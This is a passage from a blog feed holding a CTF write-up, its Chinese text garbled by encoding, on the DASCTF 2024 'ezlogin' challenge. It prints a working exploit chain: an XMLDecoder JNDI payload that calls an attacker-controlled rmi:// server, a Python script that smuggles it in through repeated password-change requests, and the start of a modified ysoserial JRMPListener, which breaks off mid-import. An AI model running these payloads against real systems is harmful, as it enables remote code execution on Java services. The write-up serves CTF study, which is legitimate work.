    <summary type="html">&lt;h1 id=&quot;xmldecoderä»‹ç»&quot;&gt;&lt;a href=&quot;#XMLDecoderä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;XMLDecoderä»‹ç»&quot;&gt;&lt;/a&gt;XMLDecoderä»‹ç»&lt;/h1&gt;&lt;p&gt;XMLDecoderæ˜¯javaè‡ªå¸¦çš„ä»¥SAXæ–¹å¼è§£æxmlçš„</summary>
      
    
    
    
    <category term="true" scheme="https://clowsman.github.io/categories/true/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2024é‡‘ç§‹åæœˆéƒ¨åˆ†é¢˜ç›®å¤ç°</title>
    <link href="https://clowsman.github.io/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-10-23T05:45:58.000Z</published>
    <updated>2024-10-26T08:12:26.534Z</updated>
    
    <content type="html"><![CDATA[<p>å®˜æ–¹wpé“¾æ¥ï¼š<a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS">https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS</a></p><h1 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h1><p>å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç™»å½•ã€æ³¨å†Œã€ä¿®æ”¹å¯†ç çš„æœåŠ¡ï¼Œçœ‹äº†ä¸€ä¸‹jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241023135607557.png" alt="image-20241023135607557"></p><p>è§åˆ°ç†Ÿæ‚‰çš„hutoolï¼Œå‰é¢çš„ciscné¢˜ç›®å¤ç°æ‰é‡åˆ°ï¼Œç„¶åspring-booté‚£å°±æ˜¯æœ‰jackson</p><p>å½“æ—¶å®¡äº†åŠå¤©çš„é€»è¾‘ï¼Œå‘ç°èƒ½ç»™ä¼ å‚çš„å‚æ•°é•¿åº¦éƒ½é™åˆ¶æ­»äº†ï¼Œä»–æœ‰ä¸€ä¸ªé»˜è®¤çš„xmlæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- this is /user/AAAAAA.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä»–çš„ç”¨æˆ·åå’Œå¯†ç çš„æœ€å¤§é•¿åº¦éƒ½æ˜¯ä»¥è¯¥æ–‡ä»¶é‡Œé¢çš„é•¿åº¦ä¸ºå‡†</p><p><img src="https://cdn.clown2024.cn/image-20241023140248515.png" alt="image-20241023140248515"></p><p>è¿™é‡Œæœ‰ä¸ªcheckå‡½æ•°é™åˆ¶é•¿åº¦ï¼Œä¸€å¼€å§‹æ²¡æ‰¾åˆ°ä»€ä¹ˆç»•è¿‡çš„åœ°æ–¹ï¼Œé‚æ‘†ğŸ˜Š</p><p>è¿™é‡Œå¼€å§‹è·Ÿç€wpå¤ç°</p><p>çœ‹EditControllerå†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241026104501910.png" alt="image-20241026104501910"></p><p>è¿™é‡Œä»JSESSIONä¸­è·å–ç™»å½•çš„ç”¨æˆ·ï¼Œç„¶åå¯¹ç”¨æˆ·åå’Œæ–°å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œå†è¿›è¡Œä¿®æ”¹å¯†ç çš„æ“ä½œ</p><p>çœ‹ä¸€ä¸‹ä»–çš„changePasswordæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026105025765.png" alt="image-20241026105025765"></p><p>è¿™é‡Œå°±æ˜¯ç®€å•çš„å°†xmlçš„å†…å®¹è¯»å‡ºæ¥ï¼Œç„¶åè¿›è¡Œæ–°æ—§å¯†ç çš„æ›¿æ¢ï¼Œæœ€åé‡æ–°å†™å…¥ï¼Œæ³¨æ„è¿™é‡Œæ²¡æœ‰å¯¹JSESSIONçš„çŠ¶æ€æ”¹å˜</p><p>åœ¨delç”¨æˆ·çš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241026105354581.png" alt="image-20241026105354581"></p><p>ä¹Ÿæ˜¯ä»JSESSIONä¸­è·å–ç”¨æˆ·ç„¶åè°ƒç”¨delUseræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026105441155.png" alt="image-20241026105441155"></p><p>è¿™é‡Œç›´æ¥å°±æŠŠuserFileç»™åˆ é™¤äº†ï¼Œä½†æ˜¯ä»–å¹¶æ²¡æœ‰é‡ç½®JSESSIONï¼Œæ„æ€å°±æ˜¯æˆ‘ä»¬çš„JSESSIONå¯ä»¥ä¿ç•™ä¸‹æ¥ï¼Œä»–è¿˜æ˜¯èƒ½å¤Ÿè¯†åˆ«çš„</p><p>ååºåˆ—åŒ–çš„ç‚¹åœ¨äºloginè·¯ç”±</p><p><img src="https://cdn.clown2024.cn/image-20241026110213423.png" alt="image-20241026110213423"></p><p>çœ‹ä»–çš„loginæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026110247575.png" alt="image-20241026110247575"></p><p>é‡Œé¢çš„ä¸€ä¸ªreadUseræ–¹æ³•æœ‰å¯¹xmlæ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åæœ‰ä¸ªwafè¿‡æ»¤äº†java.ã€springframework.ã€hutool.ï¼Œè€Œä¸”è¿˜é™åˆ¶äº†æ–‡ä»¶çš„æœ€å¤§é•¿åº¦ï¼Œå°±æ˜¯ä»–åˆå§‹ç»™æˆ‘ä»¬çš„é‚£ä¸ªAAAAAA.xmlçš„é•¿åº¦</p><p><img src="https://cdn.clown2024.cn/image-20241026123012865.png" alt="image-20241026123012865"></p><p>çœ‹å®Œå‰é¢ä¹‹åæ¼æ´ç‚¹å°±åœ¨äºchangePasswordçš„æ—¶å€™ï¼Œå› ä¸ºJSESSIONçš„çŠ¶æ€å¹¶æ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥å…¶å®æˆ‘ä»¬replaceçš„æ—¶å€™å¯ä»¥ä¿è¯oldPasswordæ˜¯ä¸€ç›´ä¸å˜çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤šæ¬¡è¯·æ±‚ä¿®æ”¹å¯†ç ï¼Œä¸€ç›´æ›¿æ¢oldPasswordæ¥å®ç°ä»»æ„å†…å®¹çš„å†™å…¥ï¼Œæ¯”å¦‚å¯ä»¥xxx&#x3D;ã€‹abcxxxï¼Œabcxxx&#x3D;ã€‹abcabcxxxï¼›</p><blockquote><p>æˆ‘ä»¬æ›¿æ¢çš„æ—¶å€™æ–°å¯†ç éœ€è¦åŠ ä¸Šæ—§å¯†ç ï¼Œè¿™æ ·å¯ä»¥ä¿è¯æˆ‘ä»¬å¯ä»¥å¯æ§åœ°è¿ç»­å†™å…¥payload</p><p>è€Œä¸”æˆ‘ä»¬æ³¨æ„å†™å…¥payloadä¹‹åè¿˜è¦ç¼©çŸ­é•¿åº¦æ»¡è¶³å…¶å°äºmaxLengthçš„è¦æ±‚</p></blockquote><p>ç°åœ¨ç»•è¿‡é•¿åº¦é™åˆ¶å†™ä»»æ„å†…å®¹çš„æ–¹æ³•æœ‰äº†ï¼Œåº”è¯¥æ€ä¹ˆå†™ï¼Œå†™ä»€ä¹ˆå‘¢</p><p>å› ä¸ºjava.è¢«ç¦æ‰äº†ï¼Œç›´æ¥å†™æ¶æ„ä»£ç çš„æ–¹æ³•è¡Œä¸é€šï¼Œwpç›´æ¥æ‰“jndiæ¥è§¦å‘Jacksonçš„é“¾å­ï¼Œspringbootæ˜¯è‡ªå¸¦Jacksonä¾èµ–</p><p>æˆ‘ä»¬è¦å†™å…¥çš„payloadå½¢å¼æ˜¯è¿™æ ·çš„</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://ip:port/a<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>userFileçš„æ–‡ä»¶é•¿è¿™æ ·</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®ç»™äº†æˆ‘ä»¬&lt;!â€“è¿™æ ·ä¸€ä¸ªæç¤ºï¼Œæ„æ€è®©æˆ‘ä»¬åˆ©ç”¨htmlçš„æ³¨é‡Šï¼Œä¹Ÿå°±æ˜¯å†™å…¥è‡ªå·±çš„payloadå°†å…¶ä»–éƒ¨åˆ†æ³¨é‡Šæ‰ï¼Œä½¿è‡ªå·±çš„å†™å…¥çš„xmlç”Ÿæ•ˆ</p><p>é‚£å®Œæ•´çš„å†™æ³•æ€è·¯å°±æ˜¯åˆ©ç”¨JSESSIONä¿ç•™çš„æ€§è´¨ï¼Œæˆ‘ä»¬å»é‡å¤æ³¨å†Œåˆ é™¤åŒä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åæ¯æ¬¡æ³¨å†Œè¿›å»éƒ½æ˜¯æˆ‘ä»¬æƒ³è¦çš„oldPasswordå¯¹åº”æˆ‘ä»¬è¦æ›¿æ¢çš„xmlå…³é”®å­—ï¼Œå½“JSESSIONæœé›†å¤Ÿäº†ä¹‹åå°±å¯ä»¥å»æ”¹è¯¥ç”¨æˆ·çš„xmläº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.å°†javaæ›¿æ¢æˆ!--æ¥æ³¨é‡Šæ‰ä¸­é—´çš„å†…å®¹<br>2.æ³¨å†Œè·å–å„ä¸ªæ ‡ç­¾çš„JSESSION<br>3.æ³¨å†Œä¸€ä¸ªpasswordä¸ºç‰¹å®šæ ‡è¯†ç¬¦ç”¨äºæ›¿æ¢çš„ï¼Œæ¯”å¦‚wpå°±ç”¨_____æ¥ä½œä¸ºæ ‡è¯†<br>4.å¯¹å„éƒ¨åˆ†è¿›è¡Œæ›¿æ¢<br></code></pre></td></tr></table></figure><p>wpçš„payloadå½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®šä¹‰RMIServeråœ°å€</span><br>rmiserver = <span class="hljs-string">&quot;test&quot;</span><br><br><span class="hljs-comment"># æ„é€ æ¶æ„Javaåºåˆ—åŒ–payloadï¼Œç”¨äºè§¦å‘æ¼æ´</span><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span> + rmiserver + <span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br><br><span class="hljs-comment"># åˆå§‹åŒ–åˆ—è¡¨ï¼Œç”¨äºå­˜å‚¨åˆ†å—åçš„payload</span><br>list1 = []<br><br><span class="hljs-comment"># éå†payloadï¼Œæ¯5ä¸ªå­—ç¬¦è¿›è¡Œåˆ†å—ï¼Œå¹¶å¯¹æœ€åä¸€å—è¿›è¡Œç‰¹æ®Šå¤„ç†</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload1), <span class="hljs-number">5</span>):<br>    <span class="hljs-comment"># å¦‚æœå‰©ä½™å­—ç¬¦å¤§äºç­‰äº5ä¸ªï¼Œåˆ™æ­£å¸¸åˆ†å—å¹¶å¡«å……ä¸‹åˆ’çº¿</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i + <span class="hljs-number">5</span>:] + <span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># å¦‚æœå‰©ä½™å­—ç¬¦ä¸è¶³5ä¸ªï¼Œåˆ™ç›´æ¥æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œå¹¶ç»“æŸå¾ªç¯</span><br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># æ‰“å°åˆæ­¥å¤„ç†åçš„åˆ—è¡¨</span><br><span class="hljs-built_in">print</span>(list1)<br><br><span class="hljs-comment"># å¦‚æœåˆ—è¡¨ä¸­æœ€åä¸€ä¸ªå…ƒç´ é•¿åº¦å°äº3ï¼Œåˆ™è¿›è¡Œç‰¹æ®Šå¤„ç†ä»¥æ„é€ ç‰¹å®šçš„è¾“å‡ºæ ¼å¼</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    <span class="hljs-comment"># å°†å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ çš„åä¸‰ä¸ªå­—ç¬¦ä¸æœ€åä¸€ä¸ªå…ƒç´ åˆå¹¶ï¼Œä»¥ä¿æŒä¿¡æ¯çš„è¿ç»­æ€§</span><br>    list1[-<span class="hljs-number">1</span>] = list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:] + list1[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># ä¿®æ­£å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä¿ç•™å…¶å¤§éƒ¨åˆ†å†…å®¹å¹¶å»é™¤æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œä¸ºå…¶åç»­ä¸æ–°çš„æœ€åä¸€ä¸ªå…ƒç´ åˆå¹¶åšå‡†å¤‡</span><br>    list1[-<span class="hljs-number">2</span>] = list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><br><span class="hljs-comment"># æ‰“å°æœ€ç»ˆå¤„ç†åçš„åˆ—è¡¨</span><br><span class="hljs-built_in">print</span>(list1)<br></code></pre></td></tr></table></figure><p>expå°±ç›´æ¥ç”¨wpçš„</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>targeturl = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-comment">#é¶æœºåœ°å€</span><br><br>rmiserver = sys.argv[<span class="hljs-number">2</span>] <span class="hljs-comment">#rmiæœåŠ¡å™¨åœ°å€</span><br><br>sessions = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/register&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span> : <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register fail: <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getsession</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">in</span> res.text.lower() :<br>        session=res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;session for <span class="hljs-subst">&#123;passwd&#125;</span> : <span class="hljs-subst">&#123;session&#125;</span>&quot;</span>)<br>        headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span> : <span class="hljs-string">f&quot;JSESSIONID=<span class="hljs-subst">&#123;session&#125;</span>&quot;</span>&#125;<br>        sessions[passwd] = headers<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;login fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">editpass</span>(<span class="hljs-params">oldpass,newpass</span>):<br>    data=&#123;<span class="hljs-string">&quot;newPass&quot;</span>:newpass&#125;<br>    headers = sessions[oldpass]<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/editPass&quot;</span>,data=data,headers=headers)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;change <span class="hljs-subst">&#123;oldpass&#125;</span> to <span class="hljs-subst">&#123;newpass&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;edit fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deluser</span>(<span class="hljs-params">passwd</span>):<br>    res = requests.get(targeturl+<span class="hljs-string">&quot;/del&quot;</span>,headers=sessions[passwd])<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;delete <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addsession</span>(<span class="hljs-params">passwd</span>):<br>    register(passwd)<br>    getsession(passwd)<br>    deluser(passwd)<br><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span>+rmiserver+<span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br>list1 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload1),<span class="hljs-number">5</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i+<span class="hljs-number">5</span>:]+<span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    list1[-<span class="hljs-number">1</span>]=list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:]+list1[-<span class="hljs-number">1</span>]<br>    list1[-<span class="hljs-number">2</span>]=list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]+list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(list1)<br><br><br>list2=[]<br>payload2=<span class="hljs-string">&quot;11111 class=\&quot;org.example.auth.User\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload2),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload2) - i &gt;= <span class="hljs-number">10</span>:<br>        list2.append(payload2[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list2.append(payload2[i:<span class="hljs-built_in">len</span>(payload2)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list2)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    addsession(s)<br><br>list3=[]<br>payload3=<span class="hljs-string">&quot;void property=\&quot;username\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload3),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload3) - i &gt;= <span class="hljs-number">10</span>:<br>        list3.append(payload3[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list3.append(payload3[i:<span class="hljs-built_in">len</span>(payload3)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list3)<br><br><br>list4=[]<br>payload4=<span class="hljs-string">&quot;void property=\&quot;password\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload4),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload4) - i &gt;= <span class="hljs-number">10</span>:<br>        list4.append(payload4[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list4.append(payload4[i:<span class="hljs-built_in">len</span>(payload4)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list4)<br><br><br><br>addsession(<span class="hljs-string">&quot;_____&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;____&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    addsession(s)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    addsession(s)<br><br>addsession(<span class="hljs-string">&quot;string&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;object&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/void&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;    &quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;1111111111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/11111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;java&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;11111&quot;</span>)<br><br>register(<span class="hljs-string">&quot;haha&quot;</span>)<br>getsession(<span class="hljs-string">&quot;haha&quot;</span>)<br>editpass(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;!--&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/11111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;    &quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/void&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;haha&quot;</span>,list1[<span class="hljs-number">0</span>])<br><br>editpass(<span class="hljs-string">&quot;11111&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-comment"># Now it&#x27;s the shortest (237)</span><br><br><span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> list1[<span class="hljs-number">1</span>::]:<br>    editpass(<span class="hljs-string">&quot;_____&quot;</span>,payload)<br><br>editpass(<span class="hljs-string">&quot;____&quot;</span>,<span class="hljs-string">&quot;&lt;!--&quot;</span>)<br><br>requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>å°†JRMPListenerä¿®æ”¹ä¸€ä¸‹ï¼Œæˆ‘çš„ä¿®æ”¹æ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.exploit;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.net.ServerSocket;<br><span class="hljs-keyword">import</span> 